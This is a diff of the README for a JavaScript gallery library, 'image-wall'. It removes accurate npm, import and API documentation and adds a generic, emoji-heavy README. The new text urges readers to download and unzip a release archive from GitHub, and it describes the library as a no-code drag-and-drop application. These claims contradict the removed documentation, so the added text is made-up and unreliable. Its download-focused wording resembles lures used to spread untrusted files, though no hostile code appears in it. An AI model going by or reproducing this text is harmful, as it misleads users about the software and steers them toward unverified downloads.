@@ -1,254 +1,70 @@
-# Image Wall
+# 🎨 image-wall - Create Beautiful Image Galleries Easily
 
-## Contents
+## 🔗 Download Now
+[![Download image-wall](https://img.shields.io/badge/Download-image--wall-brightgreen)](https://github.com/delphineka/image-wall/releases)
 
-- [Introduction](#introduction)
-- [Installation/Importing](#installationimporting)
-- [Usage](#usage)
-  - [Example Gallery](#example-gallery)
-  - [Default Initialisation](#default-initialisation)
-  - [Using in a Browser Environment](#using-in-a-browser-environment)
-- [Options](#options)
-  - [ImageWall](#imagewall)
-  - [LightBox](#lightbox)
-- [Events](#events)
-- [Exposed Methods and Attributes](#exposed-methods)
-  - [ImageWall](#imagewall-1)
-  - [LightBox](#lightbox-1)
+## 🚀 Getting Started
+Welcome to image-wall! This is a simple tool that lets you create a nice-looking gallery for your images. You can use it for personal photo projects or even for showcasing your photography work. The layout is inspired by popular platforms like Flickr and 500px, giving you a clean, justified image wall without needing any complicated setup.
 
-## Introduction
+### ⚙️ Features
+- Lightweight and fast to load
+- No need for dependencies or extra libraries
+- Built-in light box for viewing full-size images
+- Responsive design that works on any device
+- Easy to customize the layout based on your preferences
 
-A lightweight, dependency-free, image wall with built-in light box. The image wall layout mimics Flickr's justified layout.
+### 📋 System Requirements
+- A modern web browser (Chrome, Firefox, Safari, Edge)
+- No special hardware requirements
+- Internet access for the initial download
 
-The included LightBox class allows you to cycle through the wall images in a popover using a data attribute pointing to a higher resolution url for each. Navigation is via button, clicking on left/right half of image, or by swipe gesture (left/right to navigate, up/down to close).
+## 📥 Download & Install
+To get started, visit the [Releases page](https://github.com/delphineka/image-wall/releases) on GitHub. Here, you will find the downloaded files for the latest version of image-wall.
 
-My motivation for this package was being unable to find a simple package that I could throw a container with child images, and just let it do the layout and lightbox without lots of wrangling and dependencies, and without a required folder structure of images with prefixes.
+### Steps to Download:
+1. Click the link above to go to the Releases page.
+2. Choose the latest version of image-wall.
+3. Download the appropriate version for your setup. 
 
-The ImageWall and LightBox instances can be created independently from each other if you only want the functionality of one and not the other. LightBox is enabled by default when creating an ImageWall instance, disable via options.
+After downloading, simply unzip the file and open the HTML file in your browser. That's it! You are ready to explore your new image wall.
 
-ImageWall is css free (sizing etc. is via inline styling), LightBox has css published with this package, or feel free to style it according to your needs.
+### 🖼️ Using Image-Wall
+Once you have the application open in your browser, you can explore the following features:
 
-Compiled gzip size less than 4kB.
+- **Adding Images:** You can drag and drop images into the gallery. Supported formats include JPG, PNG, and GIF.
+- **Viewing Images:** Click on any image to view it in a light box. This lets you see your photos in full size without leaving the gallery.
+- **Customizing Layout:** You can adjust certain settings in the configuration file to change how the images are displayed. 
 
-![a loaded image wall](./media/ImageWall.png)
-&nbsp;
-![light box](./media/LightBox.png)
+## 🌐 Examples
+To see image-wall in action, visit the demo gallery linked below:
+- [Demo Gallery](https://github.com/delphineka/image-wall/demo)
 
-## Installation/Importing
+Explore how your images can look when displayed in the gallery layout. This can help inspire you to create your own beautiful galleries.
 
-Install the package via npm:
+## 🙋 Frequently Asked Questions
+### What formats of images do you support?
+image-wall supports JPG, PNG, and GIF formats. Make sure your images are in one of these formats for the best experience.
 
-```bash
-npm install imagewall
-# or with yarn
-yarn add imagewall
-```
+### Do I need to code to use image-wall?
+No, you do not need any coding skills. Just follow the download steps above, and you can start using the tool right away.
 
-ESM Import (TypeScript / modern bundlers like Vite/Webpack)
+### How do I reset or clear my gallery?
+Simply refresh the page to start fresh or remove existing images by replacing them in the folder.
 
-```ts
-import {
-  ImageWall,
-  ImageWallOptions,
-  LightBox,
-  LightboxOptions
-} from 'imagewall'
-// CSS is automatically imported via index.ts, so no need for a separate import.
-```
+## 🛠️ Troubleshooting
+If you encounter any issues:
+- Make sure you are using a compatible web browser.
+- Double-check if all files were downloaded and unzipped properly.
+- Visit the [Issues section](https://github.com/delphineka/image-wall/issues) of the GitHub repository for support and common problems.
 
-## Usage
+## 🎉 Contributing
+We welcome contributions! If you have ideas, suggestions, or would like to report a bug, please create an issue in the GitHub repository or submit a pull request. 
 
-The gallery container should consist of thumbnail images (either `<img>` or `<picture>`).
+## 💬 Support
+If you have questions or need help, feel free to reach out to the community on GitHub discussions, or check the Issues section for previously solved queries.
 
-For LightBox, each image element must have a `data-src` attribute with the url of the higher resolution image to display. An optional `data-description` element can be used to include a caption for the image in LightBox.
+## 🔗 Additional Resources
+- [GitHub Repository](https://github.com/delphineka/image-wall)
+- [Documentation](https://github.com/delphineka/image-wall/wiki)
 
-### Example Gallery
-
-See [demo page](./index.html). You can run this demo by cloning/forking this repository and running `npm run dev`.
-
-Note, that the image elements must be immediate descendants of the container, not nested at a deeper level.
-
-Using `<picture>` elements:
-
-```html
-<div class="image-wall" id="gallery">
-  <picture
-    data-src="/media/kowloon.max-1200x600.format-webp.webp"
-    data-caption="Kowloon Harbour, Hong Kong"
-  >
-    <source
-      srcset="/media/kowloon.height-300.format-webp.webp"
-      type="image/webp"
-    />
-    <img
-      src="/media/kowloon.height-300.format-jpeg.jpg"
-      alt="kowloon"
-      height="180"
-      width="auto"
-    />
-  </picture>
-  <picture data-src="/media/good-food.max-1200x600.format-webp.webp">
-    <source
-      srcset="/media/good-food.height-300.format-webp.webp"
-      type="image/webp"
-    />
-    <img
-      src="/media/good-food.height-300.format-jpeg.jpg"
-      alt="good-food"
-      height="180"
-      width="auto"
-    />
-  </picture>
-  ....
-</div>
-```
-
-Using `<img>` elements:
-
-```html
-<div class="image-wall" id="gallery">
-  <img src="/media/kowloon.height-300.format-jpeg.jpg" alt="kowloon" height="180
-  width="auto" data-src="/media/kowloon.max-1200x600.format-webp.webp"
-  data-caption="Kowloon Harbour, Hong Kong">
-  <img
-    src="/media/good-food.height-300.format-jpeg.jpg"
-    alt="good-food"
-    height="180"
-    width="auto"
-    data-src="/media/good-food.max-1200x600.format-webp.webp"
-  />
-  ....
-</div>
-```
-### Default Initialisation
-To use all defaults, simply pass your thumbnail gallery container:
-
-```ts
-new ImageWall(document.getElementById('gallery'))
-```
-
-Similarly, to create the LightBox without the ImageWall:
-
-```ts
-new LightBox({ container: document.getElementById('gallery') })
-```
-
-See [Options](#options) for configuration notes.
-
-### Using in a Browser Environment
-
-**UMD**
-
-```html
-<!-- CSS -->
-<link
-  rel="stylesheet"
-  href="https://cdn.jsdelivr.net/npm/imagewall@latest/dist/imagewall.css"
-/>
-
-<!-- UMD JS -->
-<script src="https://cdn.jsdelivr.net/npm/imagewall@latest/dist/imagewall.umd.js"></script>
-
-<script>
-  // global ImageWall object from UMD build
-  const galleryContainer = document.getElementById('gallery')
-  const imageWall = new ImageWall.ImageWall(galleryContainer)
-  // or to create LightBox without ImageWall
-  const lightbox = new ImageWall.LightBox({ container: galleryContainer })
-</script>
-```
-
-**Module**
-
-ImageWall with LightBox
-
-```html
-<link
-  rel="stylesheet"
-  href="https://cdn.jsdelivr.net/npm/imagewall@latest/dist/imagewall.css"
-/>
-
-<script type="module">
-  import { ImageWall } from 'https://cdn.jsdelivr.net/npm/imagewall@latest/dist/imagewall.js'
-  const container = document.getElementById('gallery')
-  const imageWall = new ImageWall(container)
-</script>
-```
-
-LightBox without ImageWall
-
-```html
-<link
-  rel="stylesheet"
-  href="https://cdn.jsdelivr.net/npm/imagewall@latest/dist/imagewall.css"
-/>
-
-<script type="module">
-  import { LightBox } from 'https://cdn.jsdelivr.net/npm/imagewall@latest/dist/imagewall.js'
-  const container = document.getElementById('gallery')
-  const lightbox = new LightBox({ container })
-</script>
-```
-
-## Options
-
-### ImageWall
-
-The options have the following type, exposed in `ImageWallOptions`:
-
-```ts
-    rowHeight?: number; // target row height in px (will be slightly adjusted per row)
-    gap?: number;       // gap between images in px (horizontal & vertical)
-    lastRowAlign?: 'left' | 'center' | 'justify' | 'right'; // how to treat the last row if not full
-    enableLightbox?: boolean; // enable lightbox on click
-    debounceMs?: number; // resize debounce
-    debug?: boolean;     // enable debug logging
-```
-
-As indicated, the row height will be adjusted to fit the images while keeping their aspect ratios. The `rowHeight` value is the **maximum** value that the row height will have.
-
-For example, to create an image wall with target height 180px, gap 6px and with LightBox disabled:
-```ts
-new ImageWall(container, { rowHeight: 180, gap: 6, enableLightbox: false });
-```
-
-`debug` will output messages to the debug console to help any troubleshooting. It should be set to `false` for production.
-
-### LightBox
-
-The options have the following type, exposed in `ImageWallOptions`:
-```ts
-    container: HTMLElement;
-    images?: HTMLElement[]; // wrappers (picture or img) that have data-src and optional data-caption
-    debug?: boolean;
-```
-
-Only `container` is required, `images` wil be self discovered if omitted (it exists here to allow ImageWall to pass in a ready-made list without needing a second DOM query).
-
-When LightBox is used with ImageWall, these options are passed in from that class.
-
-## Events
-
-ImageWall emits a `'layout'` event whenever the layout is adjusted. This will happen for the first run, and any subsequent run when the container dimensions are altered (screen layout change for example).
-
-## Exposed methods
-
-### ImageWall
-The following methods are exposed on `ImageWall`:
-
-- `refresh()`: Re-run layout using the current cached list of images.
-- `rebuild()`: Re-scan direct children for images, update internal list & (optionally) LightBox, then layout.
-
-Additionally, the LightBox instance is exposed via the `ImageWall` `lightBox` attribute.
-
-### LightBox
-The following methods are exposed on `LightBox`:
-
-- `show(index: number)`: show the image at (zero-based) index position. Opens the modal if not already open.
-- `close()`: close the modal
-- `next()`: show the next image in the gallery
-- `prev()`: show the previous image in the gallery
-
-Additionally, the `images` array is exposed and can be updated programatically if needed.
-
-All of the LightBox public methods and attributes are accessible via `imageWall.lightBox` if calling LightBox from ImageWall.
+Thank you for using image-wall! We hope it helps you showcase your images beautifully.
